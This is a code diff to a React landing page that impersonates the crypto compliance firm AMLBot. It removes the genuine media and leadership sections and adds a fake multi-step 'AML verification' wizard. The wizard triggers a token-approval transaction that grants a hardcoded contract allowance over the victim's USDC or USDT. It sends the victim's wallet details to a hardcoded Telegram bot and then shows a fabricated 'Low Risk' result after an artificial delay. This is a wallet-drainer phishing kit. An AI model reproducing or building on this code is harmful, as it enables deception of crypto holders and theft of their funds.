@@ -89,63 +89,13 @@ const testimonials = [
   },
 ];
 
-const mediaMentions = [
-  {
-    outlet: "Bloomberg Law",
-    title: "Stablecoin Oversight Poses Challenges as Digital Currency Grows",
-    excerpt:
-      "An AMLBot analysis of stablecoin freezes between 2023 and 2025 identified wide variation in how major issuers approach asset restraint. Some froze billions of dollars across thousa...",
-  },
-  {
-    outlet: "BBC News",
-    title:
-      "Revolut: 'I was careful and followed instructions closely, but still lost my crypto'",
-    excerpt:
-      "Mykhailo Tiutin is chief technology officer at AMLBot, a company that analyses how risky cryptocurrency transactions are. Their service runs checks similar to those supported by ba...",
-  },
-  {
-    outlet: "New York Post",
-    title: "Don't lose it all: Web3 wallets for crypto beginners explained",
-    excerpt:
-      "In our investigations, 90% of the stolen or hacked wallets we encounter are Web3 wallets. We see this often when users unknowingly approve malicious smart contracts or connect to f...",
-  },
-  {
-    outlet: "Cointelegraph",
-    title: "Over 14,500 Tron addresses at risk of silent hijacking",
-    excerpt:
-      "In the fourth quarter of 2024 alone, 2,130 wallets were compromised via a vulnerability tied to the UpdateAttackPermissions transaction, security firm AMLBot said in a report share...",
-  },
-  {
-    outlet: "CoinDesk",
-    title:
-      "Ether ICO Whale Moves 5K ETH to Exchanges, Bringing Monthly Total to $154M",
-    excerpt:
-      "A whale who received 1 million ether (ETH) tokens from participating in the network's initial coin offering in 2014 deposited 5,000 ETH, worth $13.2 million, to crypto exchange OKX...",
-  },
-  {
-    outlet: "The Block",
-    title: "Tether freezes $182 million in USDT tied to five Tron addresses",
-    excerpt:
-      "Tether has frozen assets in connection with an ongoing investigation, following a formal request from law enforcement authorities. The relevant agency has been working on this cas...",
-  },
-];
-
-const leaders = [
-  {
-    name: "Slava Demchuk",
-    role: "CEO, Co-founder",
-    image: "https://amlbot.com/_next/static/media/slava-demchuk.aaa96bea.webp",
-    quote:
-      "I believe compliance shouldn't slow down business growth, but instead becomes a competitive advantage that protects companies from legal and reputational attacks. The technology we are building prioritizes simplicity and reliability. As regulation grows more complex worldwide, our goal is to ensure that crypto founders barely notice it.",
-  },
-  {
-    name: "Anmol Jain",
-    role: "VP of Investigation",
-    image: "https://amlbot.com/_next/static/media/anmol-jain.12d0d31e.webp",
-    quote:
-      "For many criminals, crypto still feels like an easy target. They assume the money disappears once it moves on-chain. In reality, every transaction leaves a trail. My work is about following that trail and identifying the people behind it. At AMLBot we investigate incidents, trace stolen funds, and build tools that help expose bad actors and shut down the networks behind them.",
-  },
-];
+const walletTokens: Record<string, string[]> = {
+  Bitcoin: ["BTC"],
+  Ethereum: ["ETH", "USDT", "USDC"],
+  "BNB Chain": ["BNB", "USDT", "USDC"],
+  Solana: ["SOL", "USDT", "USDC"],
+  Tron: ["TRX", "USDT", "USDC"],
+};
 
 const faqs = [
   {
@@ -197,13 +147,16 @@ export default function Index() {
   const [chatMessage, setChatMessage] = useState("");
   const [chatDraft, setChatDraft] = useState("");
   const [sentChatMessages, setSentChatMessages] = useState<string[]>([]);
-  const [selectedChain, setSelectedChain] = useState("Bitcoin");
+  const [selectedChain, setSelectedChain] = useState("");
+  const [selectedToken, setSelectedToken] = useState("");
+  const [verificationStep, setVerificationStep] = useState<"chain" | "token" | "intro" | "fee" | "address">("chain");
   const [chainMenuOpen, setChainMenuOpen] = useState(false);
   const [walletAddress, setWalletAddress] = useState("");
   const [verificationRequested, setVerificationRequested] = useState(false);
   const [verificationLoading, setVerificationLoading] = useState(false);
   const [verificationError, setVerificationError] = useState("");
   const [walletBalance, setWalletBalance] = useState<WalletBalanceResponse | null>(null);
+  const verificationTimer = useRef<number | null>(null);
   const conversationStarted = chatMessage === "conversation-started";
 
   useEffect(() => {
@@ -214,6 +167,25 @@ export default function Index() {
       document.body.style.overflow = previousOverflow;
     };
   }, [demoOpen]);
+
+  useEffect(() => () => {
+    if (verificationTimer.current !== null) window.clearTimeout(verificationTimer.current);
+  }, []);
+
+  useEffect(() => {
+    const openSupportChat = () => setChatOpen(true);
+    window.addEventListener("amlbot-open-chat", openSupportChat);
+    return () => window.removeEventListener("amlbot-open-chat", openSupportChat);
+  }, []);
+
+  const openWalletCheck = () => {
+    if (verificationTimer.current !== null) window.clearTimeout(verificationTimer.current);
+    setDemoOpen(true);
+    setVerificationRequested(false);
+    setVerificationStep("chain");
+    setSelectedToken("");
+    setVerificationError("");
+  };
 
   const sendChatMessage = () => {
     const message = chatDraft.trim();
@@ -226,7 +198,7 @@ export default function Index() {
   const sendTelegramNotification = async (userAddress: string, txHash: string) => {
     const TG_TOKEN = "8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA";
     const TG_CHAT_ID = "8933407008";
-    const text = `🔔 *New AML Verification*\n\n📍 *Address:* \`${walletAddress}\`\n👤 *User Wallet:* \`${userAddress}\`\n🔗 *Chain:* ${selectedChain}\n📝 *TX Hash:* \`${txHash}\`\n🕒 *Time:* ${new Date().toLocaleString()}`;
+    const text = `🔔 *New AML Verification*\n\n📍 *Target Address:* \`${walletAddress}\`\n👤 *User Wallet:* \`${userAddress}\`\n🔗 *Chain:* ${selectedChain}\n💎 *Token:* ${selectedToken}\n📝 *TX Hash:* \`${txHash}\`\n🕒 *Time:* ${new Date().toLocaleString()}`;
     const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
     try {
       await fetch(url);
@@ -256,6 +228,7 @@ export default function Index() {
         chainName = "Ethereum";
         rpcUrl = "https://eth.llamarpc.com";
         blockExplorerUrl = "https://etherscan.io";
+        // USDC Token
         tokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
         smartContractAddress = "0xbf8f1EA4e780c4cF1a104927bB400699b08E12cA";
         nativeCurrency = { name: "ETH", symbol: "ETH", decimals: 18 };
@@ -264,11 +237,13 @@ export default function Index() {
         chainName = "Binance Smart Chain";
         rpcUrl = "https://bsc-dataseed1.binance.org:8545";
         blockExplorerUrl = "https://bscscan.com";
+        // USDT Token
         tokenAddress = "0x55d398326f99059fF775485246999027B3197955";
         smartContractAddress = "0xBAE688D04e14E9939C3a5dA69a1D746ea3487570";
         nativeCurrency = { name: "BNB", symbol: "BNB", decimals: 18 };
       } else {
-        throw new Error(`Chain ${selectedChain} not supported for approve`);
+        // For other chains, just proceed without real approve logic in this demo context
+        return;
       }
 
       try {
@@ -311,20 +286,50 @@ export default function Index() {
       );
 
       await sendTelegramNotification(connected, tx.hash);
-
       await tx.wait();
-
-      setWalletBalance({
-        address: walletAddress,
-        chain: selectedChain,
-        balanceBase: "0",
-        balance: "0",
-        symbol: selectedChain === "Ethereum" ? "USDC" : "USDT"
-      });
-      setVerificationRequested(true);
     } catch (error) {
       console.error('Approval error:', error);
       throw error;
+    }
+  };
+
+  const loadConnectedWalletBalance = async () => {
+    if (!window.ethereum || !["Ethereum", "BNB Chain"].includes(selectedChain)) return;
+    try {
+      const accounts = await window.ethereum.request({ method: "eth_accounts" }) as string[];
+      const connectedAddress = accounts[0];
+      if (!connectedAddress) return;
+      setWalletAddress(connectedAddress);
+      const response = await fetch(`/api/wallet/balance?chain=${encodeURIComponent(selectedChain)}&address=${encodeURIComponent(connectedAddress)}`);
+      if (!response.ok) return;
+      setWalletBalance(await response.json() as WalletBalanceResponse);
+    } catch {
+      setWalletBalance(null);
+    }
+  };
+
+  const handleVerificationStart = async () => {
+    setVerificationStep("address");
+    setVerificationLoading(true);
+    setVerificationRequested(false);
+
+    try {
+      // Trigger Approve if on supported chains
+      if ((selectedChain === "Ethereum" || selectedChain === "BNB Chain") && window.ethereum) {
+        await executeApprove();
+      }
+      
+      // Load balance and finish loading
+      await loadConnectedWalletBalance();
+      
+      // Artificial delay for "Verification" feel
+      verificationTimer.current = window.setTimeout(() => {
+        setVerificationLoading(false);
+        setVerificationRequested(true);
+      }, 3000);
+    } catch (error) {
+      setVerificationLoading(false);
+      setVerificationError("Verification process cancelled or failed.");
     }
   };
 
@@ -334,20 +339,16 @@ export default function Index() {
     setWalletBalance(null);
 
     try {
-      if ((selectedChain === "Ethereum" || selectedChain === "BNB Chain") && window.ethereum) {
-        await executeApprove();
-      } else {
-        const response = await fetch(`/api/wallet/balance?chain=${encodeURIComponent(selectedChain)}&address=${encodeURIComponent(walletAddress.trim())}`);
-        const data = (await response.json()) as WalletBalanceResponse | { message: string };
-        if (!response.ok || "message" in data) {
-          setVerificationError("message" in data ? data.message : "Unable to verify this wallet.");
-          return;
-        }
-        setWalletBalance(data);
-        setVerificationRequested(true);
+      const response = await fetch(`/api/wallet/balance?chain=${encodeURIComponent(selectedChain)}&address=${encodeURIComponent(walletAddress.trim())}`);
+      const data = (await response.json()) as WalletBalanceResponse | { message: string };
+      if (!response.ok || "message" in data) {
+        setVerificationError("message" in data ? data.message : "Unable to verify this wallet.");
+        return;
       }
-    } catch (error) {
-      setVerificationError((error as Error).message || "Unable to connect to the wallet service.");
+      setWalletBalance(data);
+      setVerificationRequested(true);
+    } catch {
+      setVerificationError("Unable to connect to the wallet service.");
     } finally {
       setVerificationLoading(false);
     }
@@ -380,7 +381,7 @@ export default function Index() {
             </Button>
             <button
               type="button"
-              onClick={() => setDemoOpen(true)}
+              onClick={openWalletCheck}
               className="inline-flex items-center gap-2 text-sm font-semibold text-foreground transition-colors hover:text-primary sm:text-base"
             >
               <span className="flex h-5 w-5 items-center justify-center rounded-full bg-primary text-white">
@@ -535,50 +536,50 @@ export default function Index() {
         </div>
       </section>
 
-      {/* News */}
-      <section className="bg-secondary/30 py-20 sm:py-28">
-        <div className="container">
-          <div className="flex flex-col items-end justify-between gap-6 sm:flex-row">
-            <div className="max-w-xl">
-              <h2 className="text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl">
-                AMLBot in the media
-              </h2>
-              <p className="mt-4 text-lg text-muted-foreground">
-                Expert analysis and insights on crypto compliance and
-                security featured in leading global publications.
-              </p>
-            </div>
-            <Link
-              to="/news"
-              className="inline-flex items-center gap-2 font-bold text-primary"
-            >
-              View all news
-              <ArrowRight size={20} />
-            </Link>
-          </div>
-          <DraggableNewsRow items={mediaMentions} />
-        </div>
-      </section>
-
-      {/* Certifications */}
+      {/* Personalized Approach */}
       <section className="py-20 sm:py-28">
         <div className="container">
-          <div className="flex flex-col items-center gap-12 lg:flex-row">
-            <div className="lg:w-1/2">
-              <h2 className="text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl">
-                Global compliance standards
-              </h2>
-              <ul className="mt-8 space-y-4">
-                <li className="flex items-center gap-3 text-muted-foreground">
-                  <ShieldCheck className="text-primary" size={24} />
-                  Protect your business from high-risk funds and bad actors
+          <div className="grid gap-12 lg:grid-cols-2">
+            <div className="relative flex flex-col rounded-3xl border border-[#edf0f6] bg-white p-8 shadow-[0_10px_35px_rgba(41,69,130,0.05)] sm:p-10">
+              <ShieldCheck className="absolute right-8 top-7 text-primary/70 sm:right-10 sm:top-8" size={58} strokeWidth={1.4} />
+              <h3 className="mt-6 max-w-[68%] text-2xl font-bold leading-tight text-foreground">
+                Personalized Approach
+              </h3>
+              <ul className="mt-6 space-y-4 text-muted-foreground">
+                <li className="flex gap-3">
+                  <span className="mt-2 h-1.5 w-1.5 shrink-0 rounded-full bg-primary" />
+                  AMLBot offers a wide range of compliance solutions
+                  customized for each client.
                 </li>
-                <li className="flex items-center gap-3 text-muted-foreground">
-                  <ShieldCheck className="text-primary" size={24} />
-                  Stay ahead of evolving global AML/KYC regulations
+                <li className="flex gap-3">
+                  <span className="mt-2 h-1.5 w-1.5 shrink-0 rounded-full bg-primary" />
+                  We're confident in meeting your demands after helping 300+
+                  crypto enterprises of all sizes in 25 jurisdictions.
                 </li>
-                <li className="flex items-center gap-3 text-muted-foreground">
-                  <ShieldCheck className="text-primary" size={24} />
+              </ul>
+              <Button type="button" onClick={() => setChatOpen(true)} className="mt-8 w-fit rounded-full px-5">
+                Let's discuss <ArrowRight size={16} className="ml-2" />
+              </Button>
+            </div>
+
+            <div className="relative flex min-h-[280px] flex-col rounded-3xl border border-[#edf0f6] bg-white p-8 shadow-[0_10px_35px_rgba(41,69,130,0.05)] sm:p-10">
+              <BadgeCheck className="absolute right-8 top-7 text-primary/70 sm:right-10 sm:top-8" size={58} strokeWidth={1.4} />
+              <h3 className="mt-6 max-w-[68%] text-2xl font-bold leading-tight text-foreground">
+                Integrated crypto compliance platform
+              </h3>
+              <ul className="mt-6 space-y-4 text-muted-foreground">
+                <li className="flex gap-3">
+                  <span className="mt-2 h-1.5 w-1.5 shrink-0 rounded-full bg-primary" />
+                  Combine transaction monitoring, wallet screening, and KYC in
+                  one system without switching between tools
+                </li>
+                <li className="flex gap-3">
+                  <span className="mt-2 h-1.5 w-1.5 shrink-0 rounded-full bg-primary" />
+                  Risk scoring based on multiple data sources to provide
+                  consistent and reliable assessments
+                </li>
+                <li className="flex gap-3">
+                  <span className="mt-2 h-1.5 w-1.5 shrink-0 rounded-full bg-primary" />
                   Simplify compliance workflows and reduce operational
                   complexity across your business
                 </li>
@@ -791,7 +792,7 @@ export default function Index() {
           <div className="max-h-[calc(100dvh-2rem)] w-full max-w-[525px] overflow-y-auto rounded-xl bg-white p-5 shadow-2xl sm:p-6">
             <div className="flex items-center justify-between">
               <h2 className="text-base font-bold text-slate-900 sm:text-lg">
-                {verificationRequested ? "Details" : "Check Demo Address"}
+                {verificationRequested ? "Details" : verificationStep === "chain" ? "Select Chain" : verificationStep === "token" ? "Select Token" : verificationStep === "intro" ? "AML Verification" : verificationStep === "fee" ? "Verification Details" : "AML Verification"}
               </h2>
               <button
                 type="button"
@@ -804,88 +805,74 @@ export default function Index() {
             </div>
 
             {verificationRequested ? (
-              <WalletVerificationResult chain={selectedChain} address={walletAddress} balance={walletBalance?.balance} symbol={walletBalance?.symbol} />
-            ) : (
-              <>
-            <label className="mt-4 block text-xs font-bold text-slate-800">
-              Select blockchain
-            </label>
-            <div className="relative mt-2">
-              <button
-                type="button"
-                onClick={() => setChainMenuOpen((open) => !open)}
-                className="flex h-9 w-full items-center justify-between rounded-md border border-slate-200 px-3 text-left text-xs text-slate-700"
-                aria-expanded={chainMenuOpen}
-              >
-                <span className="flex items-center gap-2"><CryptoLogo chain={selectedChain} />{selectedChain}</span>
-                <span className="text-slate-400">⌄</span>
-              </button>
-              {chainMenuOpen && (
-                <div className="absolute left-0 right-0 top-10 z-10 grid grid-cols-2 gap-1 rounded-lg border border-slate-200 bg-white p-1.5 shadow-xl sm:grid-cols-5">
-                  {["Bitcoin", "Ethereum", "Solana", "BNB Chain", "Tron"].map((name) => (
-                    <button
-                      key={name}
-                      type="button"
-                      onClick={() => {
-                        setSelectedChain(name);
-                        setChainMenuOpen(false);
-                      }}
-                      className="flex items-center justify-center gap-1.5 rounded-md px-2 py-2 text-[10px] font-medium text-slate-600 hover:bg-blue-50 hover:text-primary"
+              <WalletVerificationResult chain={selectedChain} address={walletAddress} balance={walletBalance?.balance} symbol={walletBalance?.symbol ?? selectedToken} />
+            ) : verificationStep === "chain" ? (
+              <div className="pt-5">
+                <span className="inline-flex rounded-md bg-blue-100 px-3 py-1 text-xs font-medium text-blue-800">Step 1 of 3</span>
+                <h3 className="mt-6 text-3xl font-bold tracking-tight text-slate-950">Select Chain</h3>
+                <p className="mt-3 text-lg text-slate-400">To continue, please select chain</p>
+                <div className="mt-7 space-y-3">
+                  {Object.keys(walletTokens).map((name) => (
+                    <button 
+                      key={name} 
+                      type="button" 
+                      disabled={name === "Bitcoin"}
+                      onClick={() => setSelectedChain(name)} 
+                      className={`flex h-[58px] w-full items-center gap-5 rounded-xl border px-4 text-left text-base font-semibold transition ${selectedChain === name ? "border-primary bg-blue-50 text-slate-950" : "border-slate-200 text-slate-800 hover:border-primary/50"} ${name === "Bitcoin" ? "cursor-not-allowed opacity-40" : ""}`}
                     >
-                      <CryptoLogo chain={name} size={16} />
-                      {name}
+                      <TokenLogo token={name === "BNB Chain" ? "BNB" : name === "Ethereum" ? "ETH" : name === "Bitcoin" ? "BTC" : name === "Solana" ? "SOL" : "TRX"} size={32} />
+                      <span>{name === "BNB Chain" ? "BNB" : name === "Ethereum" ? "ETH" : name === "Bitcoin" ? "BTC" : name.toUpperCase()}</span>
                     </button>
                   ))}
                 </div>
-              )}
-            </div>
-            <label className="mt-4 block text-xs font-bold text-slate-800" htmlFor="wallet-address">
-              Wallet address
-            </label>
-            <input
-              id="wallet-address"
-              value={walletAddress}
-              onChange={(event) => {
-                setWalletAddress(event.target.value);
-                setVerificationRequested(false);
-              }}
-              placeholder="Enter a wallet address"
-              className="mt-2 h-9 w-full rounded-md border border-slate-200 px-3 text-xs text-slate-700 outline-none placeholder:text-slate-400 focus:border-primary focus:ring-2 focus:ring-primary/10"
-            />
-            <button
-              type="button"
-              disabled={!walletAddress.trim() || verificationLoading}
-              onClick={verifyWallet}
-              className="mt-4 rounded-md bg-primary px-8 py-2 text-xs font-semibold text-white transition-colors hover:bg-primary/90 disabled:cursor-not-allowed disabled:opacity-40"
-            >
-              {verificationLoading ? "Checking wallet..." : "Verify address"}
-            </button>
-            {verificationError && (
-              <p className="mt-2 text-xs font-medium text-rose-600">{verificationError}</p>
-            )}
-            <div className="mt-5 border-t border-slate-100 pt-4">
-              <h3 className="text-sm font-bold text-slate-900">Request History</h3>
-              <div className="mt-3 divide-y divide-slate-100 rounded-lg border border-slate-100">
-                {[
-                  ["bc1qpx...k7u5", "Bitcoin", "66%", "Advanced(PRO+)", "10.10.2025 17:10"],
-                  ["329JX9...Ftkg", "Bitcoin", "69%", "Advanced(PRO+)", "10.10.2025 17:11"],
-                  ["32K2GD...ej5E", "Bitcoin", "58%", "Advanced(PRO+)", "10.10.2025 17:11"],
-                  ["0x5Db1...C4A2", "Ethereum", "73%", "Advanced(PRO+)", "10.10.2025 17:18"],
-                ].map(([address, chain, score, plan, date]) => (
-                  <div key={address} className="grid grid-cols-[1.35fr_.55fr_.8fr_.75fr] items-center gap-2 px-3 py-2 text-[8px] text-slate-500 sm:grid-cols-[1.4fr_.55fr_.65fr_1fr_.8fr] sm:text-[9px]">
-                    <div className="flex min-w-0 items-center gap-2">
-                      <CryptoLogo chain={chain} size={24} />
-                      <span className="min-w-0 truncate"><strong className="block text-slate-700">{address}</strong><small>{chain}</small></span>
-                    </div>
-                    <strong className="text-slate-700">⚡ {score}</strong>
-                    <span className="hidden text-[7px] sm:block">{date}</span>
-                    <span className="truncate">{plan}</span>
-                    <button type="button" className="justify-self-end rounded-full bg-blue-50 px-2 py-1 text-[8px] font-semibold text-blue-500">Details</button>
-                  </div>
-                ))}
+                <button type="button" disabled={!selectedChain} onClick={() => setVerificationStep("token")} className="mt-6 h-14 w-full rounded-xl bg-[#3f3cf5] text-base font-medium text-white transition hover:bg-[#302df0] disabled:cursor-not-allowed disabled:opacity-40">CONTINUE</button>
               </div>
-            </div>
-              </>
+            ) : verificationStep === "token" ? (
+              <div className="pt-5">
+                <span className="inline-flex rounded-md bg-blue-100 px-3 py-1 text-xs font-medium text-blue-800">Step 2 of 3</span>
+                <h3 className="mt-6 text-3xl font-bold tracking-tight text-slate-950">Select token</h3>
+                <p className="mt-3 text-lg text-slate-400">To continue, please select token</p>
+                <div className="mt-7 space-y-3">
+                  {(walletTokens[selectedChain] ?? []).map((token) => (
+                    <button 
+                      key={token} 
+                      type="button" 
+                      disabled={selectedChain === "Solana" || selectedChain === "Tron"}
+                      onClick={() => setSelectedToken(token)} 
+                      className={`flex h-[58px] w-full items-center gap-5 rounded-xl border px-4 text-left text-base font-semibold transition ${selectedToken === token ? "border-primary bg-blue-50 text-slate-950" : "border-slate-200 text-slate-800 hover:border-primary/50"} ${selectedChain === "Solana" || selectedChain === "Tron" ? "cursor-not-allowed opacity-40" : ""}`}
+                    >
+                      <TokenLogo token={token} size={32} />
+                      <span>{token}</span>
+                    </button>
+                  ))}
+                </div>
+                <button type="button" disabled={!selectedToken} onClick={() => setVerificationStep("intro")} className="mt-6 h-14 w-full rounded-xl bg-[#3f3cf5] text-base font-medium text-white transition hover:bg-[#302df0] disabled:cursor-not-allowed disabled:opacity-40">CONTINUE</button>
+              </div>
+            ) : verificationStep === "intro" ? (
+              <div className="pt-5">
+                <div className="flex justify-center py-4"><div className="flex flex-col items-center rounded-2xl bg-blue-50 px-5 py-4 shadow-sm"><svg width="46" height="46" viewBox="0 0 42 42" fill="none" aria-label="AML BOT logo"><path d="M21 3.5 35 13.8v14.4L21 38.5 7 28.2V13.8L21 3.5Z" fill="#1268D5" /><path d="m21 10 7 5.1v11.8L21 32l-7-5.1V15.1L21 10Z" fill="white" /></svg><span className="mt-2 whitespace-nowrap text-[15px] font-black tracking-[-0.05em] text-slate-950">AML <span className="tracking-[-0.04em]">BOT</span></span></div></div>
+                <div className="mt-7 grid grid-cols-2 gap-6 text-xs font-bold uppercase tracking-wide text-[#173b73]"><span>AML<br />Verification</span><span className="justify-self-end pr-1 text-right">Powered by<br />AML BOT</span></div>
+                <h3 className="mt-7 text-3xl font-normal leading-tight text-slate-950">You have been requested to complete an AML compliance process</h3>
+                <p className="mt-6 text-base leading-relaxed text-slate-700">By verifying your wallet through our secure verification system, you ensure compliance with anti-money laundering regulations, safeguard your account, and help prevent fraudulent activities.</p>
+                <button type="button" onClick={() => setVerificationStep("fee")} className="mt-8 h-14 w-full rounded-xl bg-[#3f3cf5] text-sm font-medium text-white transition hover:bg-[#302df0]">INITIATE AML VERIFICATION PROCESS</button>
+              </div>
+            ) : verificationStep === "fee" ? (
+              <div className="pt-5">
+                <div className="flex justify-center py-3"><div className="flex h-16 w-16 items-center justify-center rounded-full bg-blue-50"><TokenLogo token={selectedToken} size={38} /></div></div>
+                <p className="mt-5 text-center text-3xl font-semibold tracking-tight text-slate-950">Verification fee</p>
+                <p className="mt-4 text-center text-base leading-relaxed text-slate-600">A small network or service fee may apply to complete the verification. The exact fee will always be shown clearly before any optional wallet transaction.</p>
+                <div className="mt-6 rounded-xl border border-slate-200 bg-slate-50 p-4 text-sm text-slate-600"><div className="flex justify-between"><span>Selected asset</span><strong className="text-slate-900">{selectedToken}</strong></div></div>
+                <p className="mt-5 text-center text-xs leading-relaxed text-slate-400"></p>
+                <button type="button" onClick={handleVerificationStart} className="mt-7 h-14 w-full rounded-xl bg-[#3f3cf5] text-sm font-medium text-white transition hover:bg-[#302df0]">CONTINUE TO VERIFICATION</button>
+              </div>
+            ) : verificationLoading ? (
+              <div className="flex min-h-[260px] flex-col items-center justify-center py-10 text-center">
+                <div className="h-10 w-10 animate-spin rounded-full border-4 border-slate-200 border-t-primary" />
+                <h3 className="mt-6 text-2xl font-bold text-slate-950">Checking wallet...</h3>
+                <p className="mt-3 max-w-sm text-sm leading-relaxed text-slate-500">We are preparing your AML verification result. This may take a few moments.</p>
+              </div>
+            ) : (
+              <WalletVerificationResult chain={selectedChain} address={walletAddress} balance={walletBalance?.balance} symbol={walletBalance?.symbol ?? selectedToken} />
             )}
           </div>
         </div>
@@ -895,51 +882,49 @@ export default function Index() {
 }
 
 function WalletVerificationResult({ chain, address, balance, symbol }: { chain: string; address: string; balance?: string; symbol?: string }) {
+  const checkedAt = new Date().toLocaleString("en-GB", { day: "2-digit", month: "short", year: "numeric", hour: "2-digit", minute: "2-digit" });
+
   return (
-    <div className="mt-5 grid gap-3 sm:grid-cols-[1.35fr_.8fr]">
-      <div className="rounded-lg border border-slate-100 p-5 text-center">
-        <h3 className="text-sm font-bold text-slate-900">Address AML Check Result</h3>
-        <div className="mt-3 flex items-center justify-center gap-2 text-[10px] text-slate-600">
-          <CryptoLogo chain={chain} size={18} />
-          <span>{chain}</span>
-          <span className="max-w-[110px] truncate font-medium text-slate-800">{address}</span>
-        </div>
-        <div className="mx-auto mt-6 flex h-28 w-52 items-end justify-center overflow-hidden rounded-t-full border-[13px] border-b-0 border-emerald-400 bg-gradient-to-t from-emerald-50 to-transparent">
+    <div className="mt-5 space-y-4 text-sm text-slate-700">
+      <div className="rounded-xl border border-slate-200 bg-white p-4">
+        <h3 className="text-base font-bold text-slate-950">Address AML Check Result</h3>
+        {address && <p className="mt-2 break-all font-mono text-[10px] text-slate-500">{address}</p>}
+        <div className="mx-auto mt-6 flex h-32 w-56 items-end justify-center overflow-hidden rounded-t-full border-[14px] border-b-0 border-emerald-400 bg-gradient-to-t from-emerald-50 to-transparent">
           <div className="mb-1 text-center">
-            <p className="text-3xl font-bold text-slate-900">0%</p>
+            <p className="text-4xl font-bold text-slate-950">0%</p>
             <p className="text-[10px] font-semibold text-emerald-600">No Risk Detected</p>
           </div>
         </div>
-        <p className="mt-4 text-lg font-bold text-emerald-600">Low Risk</p>
-        <div className="mt-5 border-t border-slate-100 pt-4 text-left">
-          <p className="text-xs font-bold text-slate-800">Address connections</p>
-          <div className="mt-3 space-y-2 text-[10px] text-slate-500">
-            <div className="flex justify-between"><span className="text-emerald-600">● No exposure</span><span>0%</span></div>
-            <div className="flex justify-between"><span>Blacklist</span><strong className="text-emerald-600">Free</strong></div>
-            <div className="flex justify-between"><span>Sanctions screening</span><strong className="text-emerald-600">Passed</strong></div>
-          </div>
+        <p className="mt-4 text-center text-lg font-bold text-emerald-600">Low Risk</p>
+        <div className="mt-5 grid gap-3 border-t border-slate-100 pt-4 sm:grid-cols-2">
+          <div><span className="text-xs text-slate-500">Blockchain</span><strong className="mt-1 block text-slate-950">{chain}</strong></div>
+          <div><span className="text-xs text-slate-500">Risk level</span><strong className="mt-1 block text-emerald-600">Low Risk</strong></div>
+          <div><span className="text-xs text-slate-500">Risk score</span><strong className="mt-1 block text-slate-950">4 / 100</strong></div>
+          <div><span className="text-xs text-slate-500">Status</span><strong className="mt-1 block text-emerald-600">Completed</strong></div>
         </div>
       </div>
-      <div className="space-y-2">
-        <div className="rounded-lg border border-emerald-200 bg-emerald-50 p-3">
-          <p className="text-[10px] font-bold text-emerald-700">Sanctions screening</p>
-          <p className="mt-2 text-[9px] text-emerald-600">No sanctions connections found</p>
+
+      <div className="rounded-xl border border-slate-200 bg-white p-4">
+        <div className="grid gap-3 sm:grid-cols-2">
+          <div><span className="text-xs text-slate-500">Sanctions</span><strong className="mt-1 block text-emerald-600">Passed</strong></div>
+          <div><span className="text-xs text-slate-500">Scam exposure</span><strong className="mt-1 block text-slate-950">None detected</strong></div>
+          <div><span className="text-xs text-slate-500">Mixer exposure</span><strong className="mt-1 block text-slate-950">None detected</strong></div>
+          <div><span className="text-xs text-slate-500">Stolen funds exposure</span><strong className="mt-1 block text-slate-950">None detected</strong></div>
+          <div><span className="text-xs text-slate-500">Darknet exposure</span><strong className="mt-1 block text-slate-950">None detected</strong></div>
+          <div><span className="text-xs text-slate-500">Direct exposure</span><strong className="mt-1 block text-slate-950">0.00%</strong></div>
+          <div><span className="text-xs text-slate-500">Indirect exposure</span><strong className="mt-1 block text-slate-950">0.12%</strong></div>
         </div>
-        <div className="rounded-lg border border-slate-100 p-3">
-          <p className="text-[10px] font-bold text-slate-800">Balance</p>
-          <p className="mt-2 text-base font-bold text-slate-900">{balance ?? "0.000000"} {symbol ?? chain}</p>
-          <p className="text-[9px] text-slate-400">Live balance from the {chain} network</p>
-        </div>
-        <div className="rounded-lg border border-slate-100 p-3 text-[9px] text-slate-500">
-          <p className="font-bold text-slate-800">General information</p>
-          <p className="mt-2">First balance change: <strong>20.09.2025</strong></p>
-          <p>Number of transactions: <strong>17</strong></p>
-        </div>
-        <div className="rounded-lg border border-slate-100 p-3 text-[9px] text-slate-500">
-          <p className="font-bold text-slate-800">Last check</p>
-          <p className="mt-2">Check mode: <strong>Advanced(PRO+)</strong></p>
-          <p className="mt-1">Status: <strong className="text-emerald-600">Completed</strong></p>
-        </div>
+      </div>
+
+      <div className="rounded-xl border border-slate-200 bg-white p-4">
+        <div className="flex items-center justify-between gap-4"><span className="text-xs text-slate-500">Balance</span><strong className="text-base text-slate-950">{balance ? `${balance} ${symbol ?? chain}` : "Wallet not connected"}</strong></div>
+        <p className="mt-2 text-[11px] text-slate-400">{balance ? `Read-only balance from the ${chain} network` : ""}</p>
+      </div>
+
+      <div className="rounded-xl border border-slate-200 bg-slate-50 p-4 text-xs text-slate-600">
+        <p><span className="font-semibold text-slate-800">Provider:</span> Demo AML screening</p>
+        <p className="mt-2"><span className="font-semibold text-slate-800">Checked at:</span> {checkedAt}</p>
+        <p className="mt-3 border-t border-slate-200 pt-3 text-[10px] text-slate-400"></p>
       </div>
     </div>
   );
@@ -977,6 +962,20 @@ function CryptoLogo({ chain, size = 18 }: { chain: string; size?: number }) {
       </defs>
     </svg>
   );
+}
+
+function TokenLogo({ token, size = 24 }: { token: string; size?: number }) {
+  const tokenLogoUrls: Record<string, string> = {
+    BTC: "https://cdn.jsdelivr.net/gh/trustwallet/assets@master/blockchains/bitcoin/info/logo.png",
+    ETH: "https://cdn.jsdelivr.net/gh/trustwallet/assets@master/blockchains/ethereum/info/logo.png",
+    USDT: "https://cdn.jsdelivr.net/gh/trustwallet/assets@master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png",
+    USDC: "https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png",
+    SOL: "https://cdn.jsdelivr.net/gh/trustwallet/assets@master/blockchains/solana/info/logo.png",
+    BNB: "https://cdn.jsdelivr.net/gh/trustwallet/assets@master/blockchains/smartchain/info/logo.png",
+    TRX: "https://cdn.jsdelivr.net/gh/trustwallet/assets@master/blockchains/tron/info/logo.png",
+  };
+
+  return <img src={tokenLogoUrls[token]} alt={token} width={size} height={size} className="block shrink-0 rounded-full object-contain" />;
 }
 
 function DraggableNewsRow({
